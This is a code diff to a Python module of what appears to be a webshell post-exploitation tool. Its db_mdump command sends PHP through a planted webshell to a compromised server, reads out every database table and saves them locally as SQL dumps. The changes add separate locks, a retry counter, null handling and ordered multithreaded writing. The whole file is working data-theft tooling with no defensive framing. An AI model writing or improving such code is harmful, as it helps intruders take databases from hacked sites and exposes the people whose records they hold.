@@ -7,7 +7,8 @@ from libs.config import alias, color, gget
 from libs.myapp import send, get_db_connect_code, gzinflate
 
 
-LOCK = Lock()
+PRINT_LOCK = Lock()
+REQUEST_LOCK = Lock()
 
 
 def get_table_name_php(database):
@@ -73,6 +74,8 @@ def get_table_row_number(database, table):
 
 
 def get_table_construct(database, table, encoding):
+    global REQUEST_LOCK
+
     connect_type = gget("db_connect_type", "webshell")
     if (connect_type == "pdo"):
         php = """%s
@@ -103,15 +106,19 @@ def get_table_construct(database, table, encoding):
     retry_time = 5
     text = None
     while retry_time and not text:
-        res = send(php)
+        with REQUEST_LOCK:
+            res = send(php)
         try:
-            text = gzinflate(b64decode(res.r_content.strip()))
+            text = gzinflate(b64decode(res.r_text.strip()))
         except Exception:
             text = None
+        retry_time -= 1
     return text if text else ""
 
 
-def get_data(database, table, encoding, offset, blocksize):
+def get_data(index, database, table, encoding, offset, blocksize):
+    global REQUEST_LOCK
+
     connect_type = gget("db_connect_type", "webshell")
     if (connect_type == "pdo"):
         php = """%s
@@ -125,6 +132,7 @@ def get_data(database, table, encoding, offset, blocksize):
     $table_records = $con->query("select * from $table_name limit $offset,$size;");
     while($record = $table_records->fetch(PDO::FETCH_ASSOC)){
     $vals = "'".join("','",array_map('addslashes',array_values($record)))."'";
+    $vals = str_replace("''", "null", $vals);
     $content .= "insert into `$table_name` values($vals);\\r\\n";
     }
     echo base64_encode(gzdeflate($content));
@@ -141,6 +149,7 @@ def get_data(database, table, encoding, offset, blocksize):
     $table_records = $con->query("select * from $table_name limit $offset,$size;");
     while($record = mysqli_fetch_assoc($table_records)){
     $vals = "'".join("','",array_map('mysql_real_escape_string',array_values($record)))."'";
+    $vals = str_replace("''", "null", $vals);
     $content .= "insert into `$table_name` values($vals);\\r\\n";
     }
     echo base64_encode(gzdeflate($content));
@@ -150,16 +159,18 @@ def get_data(database, table, encoding, offset, blocksize):
     retry_time = 5
     text = None
     while retry_time and not text:
-        res = send(php)
+        with REQUEST_LOCK:
+            res = send(php)
         try:
-            text = gzinflate(b64decode(res.r_content.strip()))
+            text = gzinflate(b64decode(res.r_text.strip()))
         except Exception:
             text = None
-    return text if text else ""
+        retry_time -= 1
+    return index, text if text else ""
 
 
 def thread_dump(database, table, encoding, download_path, blocksize, threads):
-    global LOCK
+    global PRINT_LOCK
     table = table if table else "None"
     retry_time = 5
     row_number = -1
@@ -167,29 +178,40 @@ def thread_dump(database, table, encoding, download_path, blocksize, threads):
         row_number = get_table_row_number(database, table)
         retry_time -= 1
         if (row_number != -1):
-            with LOCK:
+            with PRINT_LOCK:
                 print(f"[Retry] fetch {database}.{table} [rows: {row_number}]")
     if (row_number == -1):
-        with LOCK:
+        with PRINT_LOCK:
             print(color.red(f"[Error] fetch {database}.{table}"))
         return
     file_name = f"{database}.{table}.sql"
     file_path = path.join(download_path, file_name).replace("\\", "/")
-    with LOCK:
+    with PRINT_LOCK:
         print(color.yellow(
             f"[Try] fetch {database}.{table} [rows: {row_number}]"))
     with open(file_path, "wb") as f, ThreadPoolExecutor(max_workers=threads) as tp:
         f.write(get_table_construct(database, table, encoding))
         f.flush()
 
-        all_task = [tp.submit(get_data, database, table, encoding, offset, blocksize)
-                    for offset in range(0, row_number, blocksize)]
+        all_task = [tp.submit(get_data, i, database, table, encoding, offset, blocksize)
+                    for i, offset in enumerate(range(0, row_number, blocksize))]
+        results = {}
+        # for i, offset in enumerate(range(0, row_number, blocksize)):
+        #     index, result = get_data(
+        #         i, database, table, encoding, offset, blocksize)
+        #     results[index] = result
+
         for future in as_completed(all_task):
-            result = future.result()
+            index, result = future.result()
             if (result):
-                f.write(future.result())
+                results[index] = result
+
+        for index in range(len(results)+1):
+            if results[index]:
+                f.write(results[index])
                 f.flush()
-        with LOCK:
+
+        with PRINT_LOCK:
             print(color.green(
                 f"[Success] fetch {database}.{table} [rows: {row_number}]"))
 
@@ -205,7 +227,7 @@ def run(database: str = "", local_path: str = "", encoding: str = "utf8", blocks
 
     eg: db_mdump {database=current_database} {local_path=doughnuts/target/site.com/{database}.sql} {encoding="utf-8"} {blocksize=1000} {exclude="",eg="table1,table2"} {include="",eg="table1,table2"} {threads=5}
     """
-    global LOCK
+    global PRINT_LOCK
     if (not gget("db_connected", "webshell")):
         print(color.red("Please run db_init command first"))
         return
@@ -217,11 +239,11 @@ def run(database: str = "", local_path: str = "", encoding: str = "utf8", blocks
     if (not res):
         return
     tables = res.r_text.strip()
-    with LOCK:
+    with PRINT_LOCK:
         print(color.yellow(f"\n[Try] Dump {database}\n"))
     with ThreadPoolExecutor(max_workers=threads) as tp:
         all_task = [tp.submit(thread_dump, database, table, encoding, download_path, blocksize, threads) for table in tables.split("\n") if table not in exclude.split(",")] if (
             not include) else [tp.submit(thread_dump, database, table, encoding, download_path, blocksize, threads) for table in tables.split("\n") if table in include.split(",")]
         wait(all_task, return_when=ALL_COMPLETED)
-        with LOCK:
+        with PRINT_LOCK:
             print(color.green(f"\n[Success] Dump {database}\n"))
